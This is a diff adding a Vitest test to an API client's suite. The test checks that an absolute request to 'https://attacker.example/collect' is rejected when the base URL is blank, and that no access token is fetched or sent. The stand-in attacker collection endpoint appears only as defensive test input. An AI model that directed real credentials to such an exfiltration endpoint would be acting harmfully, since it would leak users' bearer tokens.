@@ -39,3 +39,18 @@ it('keeps Bearer tokens on the configured API origin for absolute request paths'
     url: 'https://api.example.test/https://attacker.example/collect',
   }])
 })
+
+it('rejects absolute requests before acquiring a token when the API base URL is blank', async () => {
+  const adapter: AxiosAdapter = vi.fn()
+  const getAccessTokenSilently = vi.fn().mockResolvedValue('access-token')
+  axios.defaults.adapter = adapter
+
+  await expect(Promise.resolve().then(() =>
+    createApiClient(getAccessTokenSilently, '').get(
+      'https://attacker.example/collect',
+    ),
+  )).rejects.toThrow('API base URL is not configured')
+
+  expect(getAccessTokenSilently).not.toHaveBeenCalled()
+  expect(adapter).not.toHaveBeenCalled()
+})
